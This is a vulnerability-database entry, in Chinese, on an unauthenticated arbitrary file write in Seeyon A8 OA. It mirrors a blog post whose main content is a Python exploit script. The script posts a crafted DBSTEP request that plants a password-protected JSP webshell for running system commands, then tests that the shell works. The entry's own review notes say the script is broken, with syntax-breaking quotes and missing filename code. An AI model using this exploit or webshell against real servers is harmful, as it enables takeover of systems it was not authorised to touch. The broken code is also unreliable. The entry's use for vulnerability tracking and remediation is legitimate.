---
source: "MrWQ/vulnerability-paper"
title: "致远A8 htmlofficeservlet路径写入"
product: "致远A8"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "A8-V5 6.1sp1、A8+7.0各SP/7.1；Windows固定目录"
prerequisites: "声明无需登录"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "http://www.voidcn.com/article/p-wuabvojx-bya.html"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9CA8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%20getshell%20exp%20-%20%E7%A8%8B%E5%BA%8F%E5%9B%AD.md"
id: "vw-1d3d16efccf55012adb4d45d"
entity_id: "ve-1d3d16efccf55012adb4d45d"
schema_version: "1"
---

# 致远A8 htmlofficeservlet路径写入

## 条目说明

- 对象与具体问题：致远A8；htmlofficeservlet路径写入
- 版本、配置及部署条件：A8-V5 6.1sp1、A8+7.0各SP/7.1；Windows固定目录
- 认证与权限前提：声明无需登录
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同htmlofficeservlet多报告；Python每行带行号及弯引号导致语法错误
- 生成file_name但payload仅剩FILE行，文件名插入代码丢失，不能完成写入
- DBSTEP错误只表入口可达；所谓加密实为自定义Base64编码
- 需合并完整请求/分析，保留版本和原博客出处

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.voidcn.com](http://www.voidcn.com/article/p-wuabvojx-bya.html) 

近期爆出致远 OA 系统的一些版本存在任意文件写入漏洞，远程攻击者在无需登录的情况下可通过向 URL /seeyon/htmlofficeservlet POST 精心构造的数据即可向目标服务器写入任意文件，写入成功后可执行任意系统命令进而控制目标服务器。

目前已知易受攻击的版本：

致远A8-V5协同管理软件 V6.1sp1  
致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3  
致远A8+协同管理软件 V7.1

如果成功利用此漏洞的攻击者可以在目标系统上写入任意文件，执行任意代码，更改或删除数据。

值得注意的是该系统的默认权限很高，如果被攻击者成功利用则可能会造成很大的危害。

验证是否存在漏洞的方法：访问URL /seeyon/htmlofficeservlet 出现如下内容可能存在漏洞

DBSTEP V3.0     0            21               0             htmoffice operate err

下面贴上一段野外poc：

该poc仅供学习研究，请勿破坏他人计算机！

Poc首先是加密写入文件的路径，然后再获取加密后的路径写入任意文件Getshell

python：

```
 1 #coding=utf-8
 2 import sys
 3 import requests
 4 
 5 def encode(origin_bytes):
 6     """
 7     重构 base64 编码函数
 8     """
 9     # 将每一位bytes转换为二进制字符串
10     base64_charset = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
11     base64_bytes = [‘{:0>8}‘.format(bin(ord(b)).replace(‘0b‘, ‘‘)) for b in origin_bytes]
12  
13     resp = ‘‘
14     nums = len(base64_bytes) // 3
15     remain = len(base64_bytes) % 3
16  
17     integral_part = base64_bytes[0:3 * nums]
18     while integral_part:
19         # 取三个字节，以每6比特，转换为4个整数
20         tmp_unit = ‘‘.join(integral_part[0:3])
21         tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]
22         # 取对应base64字符
23         resp += ‘‘.join([base64_charset[i] for i in tmp_unit])
24         integral_part = integral_part[3:]
25  
26     if remain:
27         # 补齐三个字节，每个字节补充 0000 0000
28         remain_part = ‘‘.join(base64_bytes[3 * nums:]) + (3 - remain) * ‘0‘ * 8
29         # 取三个字节，以每6比特，转换为4个整数
30         # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=
31         tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]
32         resp += ‘‘.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * ‘=‘
33  
34     return resp
35 def getshell(urls):
36     url = urls + "/seeyon/htmlofficeservlet"
37     headers = {
38         "Pragma": "no-cache",
39         "Cache-Control": "no-cache",
40         "Upgrade-Insecure-Requests": "1",
41         "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
42         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
43         "Accept-Language": "zh-CN,zh;q=0.9",
44         "Connection": "close",
45     }
46     file_name = encode(‘..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\checkload32.jsp‘)
47     payload = """DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r
48 OPTION=S3WYOSWLBSGr\r
49 currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
50 CREATEDATE=wUghPB3szB3Xwg66\r
51 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
52 originalFileId=wV66\r
53 originalCreateDate=wUghPB3szB3Xwg66\r
54 FILE\r
55 needReadFile=yRWZdAS6\r
56 originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
57 <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("zs".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce"""
58     requests.post(url=url,data=payload,headers=headers)
59     result = requests.get(urls + "/seeyon/checkload32.jsp?pwd=zs&cmd=cmd+/c+echo+ZuoShou_Jsp_Shell")
60     if ‘ZuoShou_Jsp_Shell‘ in result.text :
61         print(u‘Jsp：Getshell成功\t{}‘.format(urls + "/seeyon/checkload32.jsp?pwd=zs&cmd=cmd /c whoami"))
62     else :
63         print(u‘Getshell失败‘)
64 if __name__ == ‘__main__‘:
65     if len(sys.argv)!=2 :
66         print(u"\t\t用法：python poc.py ‘http://loaclhost‘")
67     else:
68         url = sys.argv[1]
69         getshell(url)
```

修复方案：

1：对路径 /seeyon/htmlofficeservlet 进行限制访问

2：及时联系官网打补丁http://www.seeyon.com/Info/constant.html

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
